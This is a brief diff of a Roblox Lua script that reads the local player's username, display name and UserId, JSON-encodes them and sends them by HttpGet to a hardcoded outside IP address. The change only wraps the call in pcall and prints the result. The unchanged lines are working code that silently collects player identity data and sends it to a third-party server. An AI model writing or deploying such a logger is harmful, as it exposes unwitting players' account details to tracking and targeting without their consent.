@@ -1,4 +1,4 @@
-pcall(function()
+local success, err = pcall(function()
     local Username = game.Players.LocalPlayer.Name
     local Displayname = game.Players.LocalPlayer.DisplayName
     local UserId = game.Players.LocalPlayer.UserId
@@ -33,6 +33,8 @@ pcall(function()
     }
 
     local Compiled = game:GetService("HttpService"):JSONEncode(Data)
-
+    
     game:HttpGet(("http://70.105.254.224:218/?json=%s"):format(Compiled))
 end)
+
+print(success, err)
